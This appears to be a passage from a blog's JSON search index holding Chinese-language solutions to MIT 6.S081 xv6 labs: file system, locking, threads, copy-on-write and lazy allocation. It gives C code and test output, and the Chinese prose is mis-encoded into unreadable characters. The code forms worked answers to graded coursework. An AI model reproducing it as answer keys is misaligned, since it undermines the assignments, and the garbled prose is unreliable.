balloc(ip-\u003edev); log_write(bp); } brelse(bp); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; uint level2 = bn % NINDIRECT; if((addr = a[level2]) == 0){ a[level2] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); return addr; } panic(\"bmap: out of range\"); } ç„¶åä¿®æ”¹itruncå‡½æ•°ï¼Œåœ¨ truncate æ–‡ä»¶æ—¶ï¼Œé‡Šæ”¾æˆ‘ä»¬æ–°æ·»åŠ çš„åŒé‡é—´æ¥æ•°æ®å—ï¼ˆä¸è¦å¿˜äº†é‡Šæ”¾æŒ‡é’ˆå—æœ¬èº«ï¼‰ï¼š void itrunc(struct inode *ip) { int i, j, k; struct buf *bp, *nbp; uint *a, *na; for(i = 0; i \u003c NDIRECT; i++){ if(ip-\u003eaddrs[i]){ bfree(ip-\u003edev, ip-\u003eaddrs[i]); ip-\u003eaddrs[i] = 0; } } if(ip-\u003eaddrs[NDIRECT]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c NINDIRECT; j++){ if(a[j]) bfree(ip-\u003edev, a[j]); } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); ip-\u003eaddrs[NDIRECT] = 0; } if(ip-\u003eaddrs[NDIRECT+1]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c NINDIRECT; j++){ // level1 if(a[j]) { nbp = bread(ip-\u003edev, a[j]); na = (uint*)nbp-\u003edata; for(k = 0; k \u003c NINDIRECT; k++) { // level2 if(na[k]) { bfree(ip-\u003edev, na[k]); } } bfree(ip-\u003edev, a[j]); brelse(nbp); } } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); ip-\u003eaddrs[NDIRECT+1] = 0; } ip-\u003esize = 0; iupdate(ip); } è¿è¡Œbigfileæµ‹è¯•ï¼Œçœ‹åˆ°æµ‹è¯•åˆ›å»ºäº†ä¸€ä¸ª size ä¸º65803ä¸ª block çš„æœ€å¤§æ–‡ä»¶ã€‚ $ bigfile .................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. wrote 65803 blocks bigfile done; ok Symbolic links è¿™æ¬¡æˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ªsyscallï¼Œç”¨äºåˆ›å»ºç¬¦å·è¿æ¥ï¼Œç¬¦å·é“¾æ¥ä¸ä¼šå¢åŠ å®é™…æ–‡ä»¶inodeçš„ link æ•°ï¼Œåªæ˜¯ä½¿ç”¨è·¯å¾„æŒ‡å‘è¢« link çš„æ–‡ä»¶ã€‚ é¦–å…ˆï¼ŒæŒ‰ç…§ä¹‹å‰ç†Ÿæ‚‰çš„æ–¹æ³•æ·»åŠ æ–°çš„syscallã€‚ åœ¨kernel/stat.hä¸­æ·»åŠ ç¬¦å·æ–‡ä»¶ç±»å‹ï¼š #define T_SYMLINK 4 åœ¨kernel/fcntl.hä¸­æ·»åŠ ï¼š #define O_NOFOLLOW 0x800 ç”¨äºæ ‡è¯†æ˜¯è¦è¯»å–ç¬¦å·æ–‡ä»¶æœ¬èº«è¿˜æ˜¯ç¬¦å·é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶ã€‚ ä¹‹åæˆ‘ä»¬å®ç°symlinkæœ¬èº«ï¼š uint64 sys_symlink(void) { char target[MAXPATH], path[MAXPATH];; struct inode *ip; if(argstr(0, target, MAXPATH) \u003c 0|| argstr(1, path, MAXPATH) \u003c 0) { return -1; } begin_op(); if ((ip = create(path, T_SYMLINK, 0, 0)) == 0){ end_op(); return -1; } int len = strlen(target); // write target path len if(writei(ip, 0, (uint64)\u0026len, 0, sizeof(len)) \u003c sizeof(len)) { iunlockput(ip); end_op(); return -1; } // write target path if(writei(ip, 0, (uint64)target, sizeof(len), len + 1) \u003c 0) { iunlockput(ip); end_op(); return","date":"2021-03-02","objectID":"/posts/6-s081-lab9-fs/:0:0","tags":["6.S081","file system"],"title":"6.S081 lab9 fs","uri":"/posts/6-s081-lab9-fs/"},{"categories":["OS"],"content":"åœ¨æœ¬å®éªŒå®¤ä¸­ï¼Œå°†é‡æ–°è®¾è®¡ä»£ç ä»¥æé«˜å¹¶è¡Œæ€§ã€‚åœ¨å¤šæ ¸æœºå™¨ä¸Šï¼Œå¹¶è¡Œæ€§å·®çš„ä¸€ä¸ªå¸¸è§ç—‡çŠ¶æ˜¯é«˜å¼ºåº¦çš„é”ç«äº‰ã€‚æé«˜å¹¶è¡Œæ€§é€šå¸¸éœ€è¦æ”¹å˜æ•°æ®ç»“æ„å’ŒåŠ é”ç­–ç•¥ï¼Œä»¥å‡å°‘äº‰ç”¨ã€‚æ‚¨å°†å¯¹ xv6 å†…å­˜åˆ†é…å™¨å’Œæ–‡ä»¶å—ç¼“å­˜è¿›è¡Œæ”¹è¿›ã€‚ Memory allocator xv6çš„å†…å­˜åˆ†é…ä¸é‡Šæ”¾ä½¿ç”¨äº†ä¸€ä¸ªå…¨å±€é”kmem.lockï¼Œæ‰€æœ‰ cpu æƒ³è¦åˆ†é…å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œè°ƒç”¨kfree()å’Œkalloc()å°†å¯¹kmem.lockåŠ é”ï¼Œæ‰€ä»¥å¤šçº¿ç¨‹åŒæ—¶è·å–å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œå°†é€ æˆæ¿€çƒˆçš„é”ç«äº‰ã€‚æœ¬æ¬¡å®éªŒå°†ä¸ºæ¯ä¸€ä¸ª cpu å®ç°å•ç‹¬çš„ç©ºé—²å†…å­˜é“¾è¡¨ï¼Œå½“ä¸€ä¸ª cpu æ²¡æœ‰å¯ç”¨å†…å­˜æ—¶ï¼Œä»å¦ä¸€ä¸ª cpuâ€œçªƒå–â€ã€‚ åœ¨æ”¹è¿›ä¹‹å‰ï¼Œè¿›è¡Œkalloctestï¼š $ kalloctest start test1 test1 results: --- lock kmem/bcache stats lock: kmem: #fetch-and-add 134228 #acquire() 433016 lock: bcache: #fetch-and-add 0 #acquire() 1242 --- top 5 contended locks: lock: kmem: #fetch-and-add 134228 #acquire() 433016 lock: proc: #fetch-and-add 39362 #acquire() 135295 lock: virtio_disk: #fetch-and-add 8435 #acquire() 114 lock: proc: #fetch-and-add 4895 #acquire() 135334 lock: proc: #fetch-and-add 3939 #acquire() 135337 tot= 134228 test1 FAIL start test2 total free number of pages: 32499 (out of 32768) ..... test2 OK å¯ä»¥çœ‹åˆ°kmemé”çš„â€œ#fetch-and-addâ€æ•°å€¼ï¼ˆå³è‡ªæ—‹æ¬¡æ•°ï¼‰éå¸¸é«˜ï¼Œé”ç«äº‰éå¸¸å‰åˆ©ã€‚ éœ€è¦æ³¨æ„ï¼š The function cpuid returns the current core number, but itâ€™s only safe to call it and use its result when interrupts are turned off. You should use push_off() and pop_off() to turn interrupts off and on. ä¿®æ”¹kmemï¼Œkinit()ï¼Œkfreeï¼Œkallocï¼š struct { struct spinlock lock; struct run *freelist; } kmems[NCPU]; char kbuf[NCPU][20]; void kinit() { for (int i = 0; i \u003c NCPU; i++) { snprintf(kbuf[i], 20, \"kmem%d\", i); initlock(\u0026kmems[i].lock, (char*)kbuf[i]); } freerange(end, (void*)PHYSTOP); } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; // interrupt off push_off(); int cpu = cpuid(); acquire(\u0026kmems[cpu].lock); r-\u003enext = kmems[cpu].freelist; kmems[cpu].freelist = r; release(\u0026kmems[cpu].lock); // interrupt on pop_off(); } void * kalloc(void) { struct run *r; push_off(); int cpu = cpuid(); acquire(\u0026kmems[cpu].lock); r = kmems[cpu].freelist; if(r) kmems[cpu].freelist = r-\u003enext; release(\u0026kmems[cpu].lock); // steal from other cpu if(!r) { for(int i = 0; i \u003c NCPU; i++) { if (i == cpu) continue; acquire(\u0026kmems[i].lock); r = kmems[i].freelist; if (r) { kmems[i].freelist = r-\u003enext; release(\u0026kmems[i].lock); break; } release(\u0026kmems[i].lock); } } pop_off(); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } ä¿®æ”¹åè¿›è¡Œkalloctestï¼š $ kalloctest start test1 test1 results: --- lock kmem/bcache stats lock: kmem0: #fetch-and-add 0 #acquire() 65683 lock: kmem1: #fetch-and-add 0 #acquire() 190628 lock: kmem2: #fetch-and-add 0 #acquire() 176734 lock: bcache: #fetch-and-add 0 #acquire() 1242 --- top 5 contended locks: lock: proc: #fetch-and-add 35310 #acquire() 112156 lock: virtio_disk: #fetch-and-add 11562 #acquire() 114 lock: proc: #fetch-and-add 4717 #acquire() 112193 lock: proc: #fetch-and-add 4242 #acquire() 112196 lock: proc: #fetch-and-add 4058 #acquire() 112181 tot= 0 test1 OK start test2 total free number of pages: 32499 (out of 32768) ..... test2 OK å¯ä»¥çœ‹åˆ°kmemé”ç«äº‰æ¶ˆå¤±äº†ã€‚ Buffer cache åœ¨xv6ä¸­ï¼Œä½¿ç”¨buffer cacheç¼“å­˜ä¸€ä¸ªç£ç›˜blockçš„å†…å®¹ï¼Œbcacheä½¿ç”¨ä¸€ä¸ªé”æ¥ç»´æŠ¤ï¼Œæ¯æ¬¡bgetå’Œbrelseéƒ½éœ€è¦è·å–é”ï¼Œè¿™æ ·å°†å¸¦æ¥å¾ˆæ¿€çƒˆçš„é”ç«äº‰ã€‚ åœ¨ä¿®æ”¹å‰ï¼Œbcachetestæµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š $ bcachetest start test0 test0 results: --- lock kmem/bcache stats lock: bcache: #fetch-and-add 90245 #acquire() 65022 --- top 5 contended locks: lock: virtio_disk: #fetch-and-add 157311 #acquire() 1137 lock: bcache: #fetch-and-add 90245 #acquire() 65022 lock: proc: #fetch-and-add 82586 #acquire() 73871 lock: proc: #fetch-and-add 59647 #acquire() 73519 lock: proc: #fetch-and-add 29617 #acquire() 73520 tot= 90245 test0: FAIL start test1 test1 OK æ ¹æ®å®éªŒæŒ‡å¯¼ï¼Œæˆ‘ä»¬å°†bcacheçš„æ•°æ®ç»“æ„ç”±ä¸€ä¸ªåŒå‘é“¾è¡¨æ”¹ä¸ºhashtableï¼Œbucketæ•°é‡ä½¿ç”¨ç´ æ•°æ¥å‡å°‘ hash ç¢°æ’ï¼Œå…¶ä¸­steal_lockæ˜¯æ•´ä¸ªbcacheçš„å¤§é”ã€‚ #define NBUCKET 13 struct { struct buf head[NBUCKET]; struct spinlock lock[NBUCKET]; struct buf buf[NBUF]; struct spinlock steal_lock; } bcache; uint ihash(uint blockno) { return blockno % NBUCKET; } ä¿®æ”¹åˆå§‹åŒ–ä»£ç ï¼Œå°†æ¯ä¸ªbucketæŒ‡å‘çš„bufæ„é€ æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ–¹ä¾¿æŸ¥æ‰¾å¤´å°¾ï¼Œæ¯æ¬¡è¢«é‡Šæ”¾çš„bufå°†è¢«ç§»åˆ°å¤´éƒ¨ï¼Œä»¥å®ç° LRUï¼Œå‡å°‘æŸ¥æ‰¾é•¿åº¦ã€‚ char buf[NBUCKET][20]; void binit(void) { struct buf *b; for (int i = 0; i \u003c NBUCKET; i++) { snprintf(buf[i], 20","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:0:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"æœ¬å®éªŒå®¤å°†è®©ä½ ç†Ÿæ‚‰å¤šçº¿ç¨‹ã€‚æ‚¨å°†åœ¨ç”¨æˆ·çº§çº¿ç¨‹åŒ…ä¸­å®ç°çº¿ç¨‹åˆ‡æ¢ï¼›ä½¿ç”¨å¤šçº¿ç¨‹æ¥åŠ å¿«ç¨‹åºçš„é€Ÿåº¦ï¼›å¹¶å®ç°ä¸€ä¸ªbarrierã€‚ Uthread: switching between threads å®éªŒä»£ç ä¸­ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªç”¨æˆ·çº§åˆ«çº¿ç¨‹åº“ï¼Œéœ€è¦æˆ‘ä»¬å®ç°çº¿ç¨‹åˆ‡æ¢éƒ¨åˆ†ã€‚æˆ‘ä»¬éœ€è¦ç»™user/uthread.cä¸­çš„thread_create()å’Œthread_schedule()ï¼Œä»¥åŠuser/uthread_switch.Sä¸­çš„thread_switchæ·»åŠ ä»£ç ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä¸ºthreadæ·»åŠ contextä»¥ä¿å­˜calleeå¯„å­˜å™¨å€¼ï¼Œä»kernel/proc.hä¸­å¤åˆ¶å³å¯ã€‚ struct context { uint64 ra; uint64 sp; // callee-saved uint64 s0; uint64 s1; uint64 s2; uint64 s3; uint64 s4; uint64 s5; uint64 s6; uint64 s7; uint64 s8; uint64 s9; uint64 s10; uint64 s11; }; struct thread { char stack[STACK_SIZE]; /* the thread's stack */ int state; /* FREE, RUNNING, RUNNABLE */ struct context context; }; ç„¶åæ˜¯``thread_create()`ï¼š void thread_create(void (*func)()) { struct thread *t; for (t = all_thread; t \u003c all_thread + MAX_THREAD; t++) { if (t-\u003estate == FREE) break; } t-\u003estate = RUNNABLE; // YOUR CODE HERE // user ra return func in switch t-\u003econtext.ra = (uint64)func; // point to stack top(highest addr) t-\u003econtext.sp = (uint64)t-\u003estack + STACK_SIZE; } åˆ©ç”¨raåœ¨ switch åˆ° thread åï¼Œè¿”å›åˆ°å‡½æ•°çš„ä½ç½®ï¼Œå°†spæŒ‡å‘è¯¥threadçš„æ ˆé¡¶ã€‚ æœ€åæ˜¯thread_scheduleï¼š if (current_thread != next_thread) { /* switch threads? */ next_thread-\u003estate = RUNNING; t = current_thread; current_thread = next_thread; /* YOUR CODE HERE * Invoke thread_switch to switch from t to next_thread: * thread_switch(??, ??); */ thread_switch((uint64)\u0026t-\u003econtext, (uint64)\u0026current_thread-\u003econtext); } è‡³äºthread_switchçš„ä»£ç ï¼Œç›´æ¥ä»kernel/switch.Sä¸­å¤åˆ¶å³å¯ã€‚ Using threads åé¢çš„ä¸¤å…³éƒ½å’Œxv6æ— å…³äº†ï¼Œå¤§æ¦‚æ˜¯æœ‰ä¸€äº›å¤šçº¿ç¨‹çš„ featureï¼Œxv6æ— æ³•æä¾›ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬ä½¿ç”¨pthreadã€‚ å®éªŒä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ— é”çš„hashtableï¼Œå•çº¿ç¨‹ä¸‹æ‰§è¡Œæ— è¯¯ï¼Œä½†æ˜¯å¤šçº¿ç¨‹æ‰§è¡Œæ—¶ï¼Œä¼šå‘ç”Ÿå¦‚ä¸‹é—®é¢˜ï¼š â¯ ./ph 2 100000 puts, 1.780 seconds, 56190 puts/second 0: 16577 keys missing 1: 16577 keys missing 200000 gets, 4.343 seconds, 46055 gets/second è¿™æ˜¯å› ä¸ºï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ’å…¥hashtableçš„ä¸€ä¸ªbucketæ—¶ï¼Œä¼šå¯¼è‡´ key ä¸¢å¤±ã€‚ æˆ‘ä»¬å¯¹putæ“ä½œåŠ é”å³å¯ï¼ˆä¸è¦å¿˜äº†åœ¨main()å‡½æ•°ä¸­åˆå§‹åŒ–locksï¼‰ï¼š pthread_mutex_t locks[NBUCKET]; static void put(int key, int value) { int i = key % NBUCKET; pthread_mutex_lock(\u0026locks[i]); // is the key already present? struct entry *e = 0; for (e = table[i]; e != 0; e = e-\u003enext) { if (e-\u003ekey == key) break; } if(e){ // update the existing key. e-\u003evalue = value; } else { // the new is new. insert(key, value, \u0026table[i], table[i]); } pthread_mutex_unlock(\u0026locks[i]); } Barrier æœ¬å…³è¦æ±‚æˆ‘ä»¬å®ç°ä¸€ä¸ªbarrieï¼šåœ¨æŸä¸ªç‚¹ä¸Šï¼Œæ‰€æœ‰ç›¸å…³çš„çš„çº¿ç¨‹å¿…é¡»ç­‰å¾…ï¼Œç›´åˆ°æ‰€æœ‰å…¶ä»–ç›¸å…³çš„çº¿ç¨‹ä¹Ÿåˆ°è¾¾è¿™ä¸ªç‚¹ã€‚è¿™ä¸ªæˆ‘ä»¬å‚è€ƒxv6ä¸­çš„sleepå’Œwaitçš„ä½¿ç”¨å³å¯ï¼š static void barrier() { // YOUR CODE HERE // // Block until all threads have called barrier() and // then increment bstate.round. // pthread_mutex_lock(\u0026bstate.barrier_mutex); bstate.nthread++; if (bstate.nthread == nthread) { bstate.round++; bstate.nthread = 0; pthread_cond_broadcast(\u0026bstate.barrier_cond); } else { pthread_cond_wait(\u0026bstate.barrier_cond, \u0026bstate.barrier_mutex); } pthread_mutex_unlock(\u0026bstate.barrier_mutex); } æœ€ç»ˆä»£ç è§GitHub ä»“åº“ã€‚ ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:0:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Copy-on-Write Fork for xv6 è¿™æ¬¡ lab åªæœ‰ä¸€å…³ï¼Œé‚£å°±æ˜¯ä¸ºxv6å®ç°copy on writeã€‚ xv6ä¸­çš„fork()ç³»ç»Ÿè°ƒç”¨å°†çˆ¶è¿›ç¨‹çš„ç”¨æˆ·å†…å­˜å…¨éƒ¨å¤åˆ¶åˆ°å­è¿›ç¨‹ä¸­ã€‚å¦‚æœçˆ¶è¿›ç¨‹å†…å­˜å ç”¨å¾ˆå¤§ï¼Œå¤åˆ¶å¯èƒ½éœ€è¦å¾ˆé•¿çš„æ—¶é—´ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œé€šå¸¸æ¥è¯´ï¼Œè¿™ä¸ªå¤åˆ¶åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯æµªè´¹çš„ï¼›ä¾‹å¦‚ï¼Œåœ¨å­è¿›ç¨‹ä¸­ï¼Œfork()ä¹‹åçš„exec()è°ƒç”¨ä¼šå¯¼è‡´å­è¿›ç¨‹ä¸¢å¼ƒå¤åˆ¶çš„å†…å­˜ï¼Œå¯èƒ½å¤§éƒ¨åˆ†å†…å­˜éƒ½æ²¡æœ‰æ¥å¾—åŠä½¿ç”¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœçˆ¶å­åŒæ–¹éƒ½ä½¿ç”¨ä¸€ä¸ªpageï¼Œå¹¶ä¸”å…¶ä¸­ä¸€æ–¹æˆ–åŒæ–¹éœ€è¦å†™è¿™ä¸ªpageï¼Œé‚£ä¹ˆç¡®å®éœ€è¦å¤åˆ¶ã€‚ æ ¹æ®å®˜ç½‘ç»™çš„æç¤ºï¼š ä½¿ç”¨å¼•ç”¨è®¡æ•°ï¼Œå¯¹æ¯ä¸ªç‰©ç†é¡µé¢ç»´æŠ¤ä¸€ä¸ªreference countï¼Œè®°å½•ç‰©ç†é¡µé¢è¢« map çš„æ¬¡æ•°ã€‚ kernel/kalloc.c struct { struct spinlock lock; struct run *freelist; int rc[PHYSTOP / PGSIZE]; } kmem; void freerange(void *pa_start, void *pa_end) { char *p; p = (char*)PGROUNDUP((uint64)pa_start); for(; p + PGSIZE \u003c= (char*)pa_end; p += PGSIZE) { kmem.rc[(uint64)p / PGSIZE] = 1; kfree(p); } } void increase_rc(uint64 pa) { acquire(\u0026kmem.lock); kmem.rc[pa / PGSIZE]++; release(\u0026kmem.lock); } åˆ©ç”¨ RISC-V PTE ä¸­çš„RSW (reserved for software)ä½æ¥æ ‡è®°cowé¡µï¼Œä¿®æ”¹uvmcopy(),åœ¨å¤åˆ¶å†…å­˜æ—¶ï¼Œä»…å°†çˆ¶è¿›ç¨‹çš„ç‰©ç†é¡µé¢ map åˆ°å­è¿›ç¨‹é¡µè¡¨ä¸­ï¼Œå¹¶æ¸…é™¤åŒæ–¹PTEä¸­çš„PTE_Wæ ‡å¿—ã€‚ åœ¨kernel/riscv.hä¸­åŠ å…¥ï¼š #define PTE_COW (1L \u003c\u003c 8) åœ¨kernel/vm.cä¸­åŠ å…¥ï¼š int uvmcopy(pagetable_t old, pagetable_t new, uint64 sz) { pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i \u003c sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(\"uvmcopy: pte should exist\"); if((*pte \u0026 PTE_V) == 0) panic(\"uvmcopy: page not present\"); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); // only for writable page if (flags \u0026 PTE_W) { flags = (flags | PTE_COW) \u0026 (~PTE_W); *pte = PA2PTE(pa) | flags; } increase_rc(pa); if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1; } æ³¨æ„mappageså¤±è´¥æ—¶ï¼Œåˆ æ‰åŸæœ‰çš„kfree(mem)ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰ç”³è¯·æ–°çš„å†…å­˜ã€‚ å‘ç”Ÿpage falutæ—¶ï¼Œåœ¨usertrap()ä¸­æ•è·ï¼Œå¯¹cow pageåˆ†é…çœŸæ­£çš„ç‰©ç†å†…å­˜ã€‚ kernel/kalloc.c int cow_alloc(pagetable_t pagetable, uint64 va) { uint64 pa; uint64 mem; pte_t *pte; if (va \u003e= MAXVA) return -1; va = PGROUNDDOWN(va); pte = walk(pagetable, va, 0); if (pte == 0) { return -1; } // not a valid cow page if (!(*pte \u0026 PTE_V)) { return -2; } pa = PTE2PA(*pte); // only one rf, make it writable acquire(\u0026kmem.lock); if (kmem.rc[pa / PGSIZE] == 1) { *pte \u0026= ~PTE_COW; *pte |= PTE_W; release(\u0026kmem.lock); return 0; } release(\u0026kmem.lock); if ((mem = (uint64)kalloc()) == 0){ return -3; } memmove((void *)mem, (void *)pa, PGSIZE); *pte = ((PA2PTE(mem) | PTE_FLAGS(*pte) | PTE_W) \u0026 (~PTE_COW)); // decrease rc kfree((void *)pa); return 0; } åœ¨æˆ‘çš„å®ç°ä¸­ï¼Œå½“cow pageå‘ç”Ÿpage faultï¼Œä¸”reference countä¸º 1 æ—¶ï¼Œä¸å†é‡æ–°åˆ†é…é¡µé¢è¿›è¡Œå¤åˆ¶ï¼Œè€Œæ˜¯ç›´æ¥å°†è¯¥é¡µé¢æ¶ˆå»PTE_COWå¹¶åŠ ä¸ŠPTE_Wï¼Œå‡å°‘å†…å­˜åˆ†é…å’Œå¤åˆ¶æ“ä½œã€‚ åœ¨kernel/trap.cï¼š else if(r_scause() == 13 || r_scause() == 15) { va = r_stval(); if (va \u003c PGROUNDDOWN(p-\u003etrapframe-\u003esp) \u0026\u0026 va \u003e= PGROUNDDOWN(p-\u003etrapframe-\u003esp) - PGSIZE) { // guard page p-\u003ekilled = 1; } else { int ret; if((ret = cow_alloc(p-\u003epagetable, va)) \u003c 0 ) { p-\u003ekilled = 1; } } } å½“ä½¿ç”¨kalloc()è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œéœ€è¦å°†å¯¹åº”pageçš„reference countè®¾ç½®ä¸º 1ï¼Œä½¿ç”¨kfree()é‡Šæ”¾å†…å­˜æ—¶ï¼Œåªèƒ½å°†reference countä¸º 0 çš„é¡µé¢æ”¾å›ç©ºé—²åˆ—è¡¨ã€‚ kernel/kalloc.cï¼š void * kalloc(void) { struct run *r; acquire(\u0026kmem.lock); r = kmem.freelist; if(r) { kmem.freelist = r-\u003enext; kmem.rc[(uint64)r / PGSIZE] = 1; } release(\u0026kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); acquire(\u0026kmem.lock); kmem.rc[(uint64)pa / PGSIZE]--; if(kmem.rc[(uint64)pa / PGSIZE] \u003c= 0) { memset(pa, 1, PGSIZE); r = (struct run*)pa; r-\u003enext = kmem.freelist; kmem.freelist = r; } release(\u0026kmem.lock); } æ³¨æ„ï¼škfree()ä¸­ï¼Œå¯¹äºkmem.rc[(uint64)pa / PGSIZE]çš„ä¿®æ”¹å’Œè¯»å–å¿…é¡»æ˜¯ä¸€ä¸ªåŸå­æ“ä½œï¼Œå¦åˆ™å†…å­˜å¯èƒ½è¢«é‡å¤é‡Šæ”¾ï¼Œä¾‹å¦‚å¯¹äºæŸä¸ªç‰©ç†pageï¼ŒåŒæ—¶ map åˆ° Aã€B çš„é¡µè¡¨ä¸­ï¼Œä¹‹åï¼š A : ref - 1 B : ref - 1 A : ref == 0 =\u003e free B : ref == 0 =\u003e free æœ€åï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹copyout()ï¼ŒåŒlazy allocationä¸€æ ·ï¼Œå½“å› ä¸ºç³»ç»Ÿè°ƒç”¨åˆ‡æ¢åˆ°å†…æ ¸é¡µè¡¨æ—¶ï¼Œç¡¬ä»¶æ— æ³•å†ä¸ºå†™cow pageäº§ç”Ÿpage faultï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å¤„ç†ï¼š int copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len) { uint64 n, va0, pa0; while(len \u003e 0){ va0 = PGROUNDDOWN(dstva); cow_alloc(pagetable, va0); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n \u003e len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0; } è‡³æ­¤ä¾¿å®Œæˆäº† lab6 copy on writeã€‚ æœ€ç»ˆä»£ç è§GitHub ä»“åº“ã€‚ ","date":"2021-02-27","objectID":"/posts/6-s081-lab6-cow/:0:0","tags":["6.S081","cow"],"title":"6.S081 lab6 cow","uri":"/posts/6-s081-lab6-cow/"},{"categories":["OS"],"content":"Eliminate allocation from sbrk() è¿™æ¬¡å®éªŒçš„ç¬¬ä¸€å…³éå¸¸ç®€å•ï¼Œå°±æ˜¯ä»sbrkè°ƒç”¨ä¸­å–æ¶ˆå†…å­˜åˆ†é…ï¼Œä¸ºä¹‹åçš„lay allocationåšå‡†å¤‡ã€‚ uint64 sys_sbrk(void) { int addr; int n; if(argint(0, \u0026n) \u003c 0) return -1; struct proc *p = myproc(); addr = p-\u003esz; p-\u003esz += n; return addr; } hints æç¤ºæˆ‘ä»¬ï¼Œä¿®æ”¹å®Œä»£ç åï¼Œå°è¯•è¿è¡Œecho hiï¼Œä¼šäº§ç”Ÿç±»ä¼¼ä¸‹é¢çš„ç»“æœ: $ echo hi usertrap(): unexpected scause 0x000000000000000f pid=3 sepc=0x0000000000001258 stval=0x0000000000004008 va=0x0000000000004000 pte=0x0000000000000000 panic: uvmunmap: not mapped å…¶å®å¹¶ä¸ä¸€å®šæ˜¯echoæ‰ä¼šå¯¼è‡´ crashï¼Œå…¶ä»–çš„æ‰§è¡Œä»»æ„çš„å‘½ä»¤æˆ–è€…è¾“å…¥æ— æ„ä¹‰å­—ç¬¦éƒ½ä¼šå¯¼è‡´ crashã€‚åœ¨user/umalloc.cä¸­ï¼Œmorecoreè°ƒç”¨äº†sbrkï¼Œmallocè°ƒç”¨äº†morecoreã€‚åœ¨user/sh.cä¸­ï¼Œshell è¿è¡Œè¿‡ç¨‹ä¸­ä¸æ–­åœ°è°ƒç”¨mallocä¸º command ç”³è¯·åˆ†é…ç©ºé—´ï¼Œç„¶åè¿è¡Œ commandã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œmalloc å¹¶æœªçœŸæ­£åˆ†é…ç©ºé—´ï¼Œè¿è¡Œæ—¶è®¿é—®åˆ°å¯¹åº”è™šæ‹Ÿåœ°å€å°±ä¼šäº§ç”Ÿ page faultï¼Œå¯¼è‡´ panicï¼› Lazy allocation è¿™ä¸€å…³éœ€è¦æˆ‘ä»¬å®ç°lazy allocationï¼Œåœ¨usertrap()ä¸­å¤„ç†page faultï¼Œä¸ºäº§ç”Ÿpage faultçš„è™šæ‹Ÿåœ°å€åˆ†é…ä¸€ä¸ªçœŸå®çš„ç‰©ç†é¡µé¢ï¼Œå¹¶ map åˆ°å¯¹åº”è™šæ‹Ÿåœ°å€ã€‚ r_scause()ç”¨äºè·å– trap äº§ç”Ÿçš„åŸå› ï¼Œä¸º 13/15 æ—¶ä¸ºpage faultã€‚ r_stval()è·å–stvalå¯„å­˜å™¨å€¼ï¼Œå®ƒæ˜¯å¯¼è‡´page faultçš„è™šæ‹Ÿåœ°å€å€¼ã€‚ uvmunmap()ä¼š panicï¼Œå› ä¸ºè¿›ç¨‹åœ°å€ç©ºé—´æœ‰äº›è™šæ‹Ÿåœ°å€å¹¶æœªè¢« mapï¼Œæ‰€è¦åŠ ä»¥ä¿®æ”¹ã€‚ å‚ç…§uvmalloc()ï¼Œå®Œæˆå¦‚ä¸‹å‡½æ•°ï¼Œä¸ºè™šæ‹Ÿåœ°å€vaåˆ†é…ä¸€ä¸ªçœŸå®ç‰©ç†é¡µï¼š uint64 lazy_uvmalloc(pagetable_t pagetable, uint64 va) { char *mem; va = PGROUNDDOWN(va); mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); if(mappages(pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { kfree(mem); return -1; } return 0; } åœ¨usertrap()ä¸­åŠ å…¥å¯¹äºpage 